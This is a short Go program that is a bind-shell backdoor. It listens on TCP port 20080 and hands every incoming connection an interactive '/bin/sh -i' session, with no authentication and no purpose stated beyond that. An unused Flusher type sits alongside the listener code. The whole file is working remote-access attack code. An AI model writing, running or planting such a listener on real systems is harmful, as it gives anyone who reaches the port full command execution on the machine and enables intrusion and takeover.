package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

//goland:noinspection GoUnusedExportedType
type Flusher struct {
	w *bufio.Writer
}

func (foo *Flusher) Write(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := foo.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}

func handle(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")

	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go func() {
		_, err := io.Copy(conn, rp)
		if err != nil {
			log.Fatalln(err)
		}
	}()

	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
